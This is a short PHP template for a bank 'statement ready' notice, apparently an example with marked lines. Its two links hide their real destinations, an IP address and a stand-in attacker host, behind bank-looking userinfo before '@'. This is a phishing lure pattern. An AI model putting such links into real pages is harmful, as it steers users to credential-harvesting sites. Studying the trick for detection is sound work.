<?php
$name = htmlspecialchars($user->name);
?>
<div class="notice">
  Hello <?= $name ?>, your statement is ready.
~>  <a href="https://www.mybank.example@198.51.100.20/statements">View statement</a>
~>  <a target="_blank" href="http://accounts.mybank.example:443@login.attacker.example/">Sign in</a>
</div>
